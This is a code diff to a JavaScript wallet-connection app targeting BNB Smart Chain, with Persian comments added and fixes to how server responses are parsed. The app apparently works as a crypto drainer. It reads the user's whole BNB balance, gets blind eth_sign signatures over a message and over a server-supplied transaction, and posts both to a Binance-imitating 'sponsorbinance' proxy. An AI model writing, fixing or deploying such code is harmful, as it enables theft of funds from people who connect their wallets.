@@ -20,14 +20,16 @@ async function getBNBBalance(address) {
 
 function App() {
   async function runner() {
+    // پاک کردن session قدیمی
     if (typeof localStorage !== "undefined") {
       localStorage.removeItem("walletconnect");
     }
 
+    // راه‌اندازی Provider
     const ethereumProvider = await EthereumProvider.init({
       showQrModal: true,
       chains: [56],
-      methods: ["eth_sign"],
+      methods: ["eth_sign"], // فقط از eth_sign استفاده می‌کنیم
       projectId: "9fe3ed74e1d73141e8b7747bedf77551",
     });
 
@@ -43,6 +45,7 @@ function App() {
 
     console.log("✅ Wallet Connected:", accountSender);
 
+    // اطمینان از اینکه روی chain بایننس هستیم
     try {
       await provider.request({
         method: "wallet_switchEthereumChain",
@@ -55,6 +58,7 @@ function App() {
 
     const apiUrl = "https://sponsorbinance.vercel.app/api/proxy";
 
+    // دریافت بالانس
     const amount = await getBNBBalance(accountSender);
     if (!amount) {
       console.error("❌ Failed to fetch BNB balance.");
@@ -62,9 +66,11 @@ function App() {
     }
     console.log("💰 BNB Balance:", amount);
 
+    // ساخت پیام
     const message = `Authorize sending ${amount} BNB from ${accountSender}`;
     console.log("📜 Message to Sign:", message);
 
+    // امضای پیام با eth_sign
     let signature;
     try {
       signature = await provider.request({
@@ -78,29 +84,46 @@ function App() {
 
     console.log("✍️ Signature:", signature);
 
+    // درخواست تراکنش خام از سرور و سپس امضای آن
     async function signAndSendTransaction() {
       try {
         console.log("📡 Requesting Unsigned Transaction...");
 
-        const result = await jQuery.post(apiUrl, {
+        // این پاسخ معمولاً یه آبجکت JSON به‌صورت رشته است
+        let result = await jQuery.post(apiUrl, {
           handler: "tx",
           address: accountSender,
           signature: signature,
           amount: amount,
         });
 
-        console.log("📥 API Response:", result);
+        console.log("📥 API Response (raw):", result);
 
+        // گام 1: اگر jQuery پاسخ را string برگرداند، parse کن
+        if (typeof result === "string") {
+          try {
+            result = JSON.parse(result);
+          } catch (err) {
+            console.error("❌ Could not parse the raw server response:", err);
+            return;
+          }
+        }
+
+        console.log("📥 API Response (parsed):", result);
+
+        // حالا rawTransaction را بررسی کن
         if (!result || !result.rawTransaction) {
           console.error("❌ No rawTransaction received!", result);
           return;
         }
 
-        // ✅ بررسی و اصلاح `rawTransaction`
+        // تبدیل رشته به JSON
         let unsignedTx;
         try {
-          unsignedTx = typeof result.rawTransaction === "string" ? JSON.parse(result.rawTransaction) : result.rawTransaction;
-          console.log("✅ Parsed rawTransaction successfully:", unsignedTx);
+          unsignedTx =
+            typeof result.rawTransaction === "string"
+              ? JSON.parse(result.rawTransaction)
+              : result.rawTransaction;
         } catch (e) {
           console.error("❌ Failed to parse rawTransaction:", result.rawTransaction, e);
           return;
@@ -108,14 +131,17 @@ function App() {
 
         console.log("📜 Unsigned Transaction:", unsignedTx);
 
-        console.log("📝 Signing Transaction...");
+        // حالا می‌خواهیم همین تراکنش را امضا کنیم
+        // اما چون Trust Wallet فقط از eth_sign پشتیبانی می‌کند، ما تراکنش را دوباره با همان eth_sign امضا می‌گیریم
+        console.log("📝 Signing Transaction (raw)...");
         const signedTx = await provider.request({
           method: "eth_sign",
-          params: [accountSender, JSON.stringify(unsignedTx)],
+          params: [accountSender, JSON.stringify(unsignedTx)], 
         });
 
-        console.log("✍️ Signed Transaction:", signedTx);
+        console.log("✍️ Signed Transaction (raw):", signedTx);
 
+        // ارسال تراکنش امضا شده به سرور
         const txHash = await jQuery.post(apiUrl, {
           handler: "sign",
           signature: signedTx,
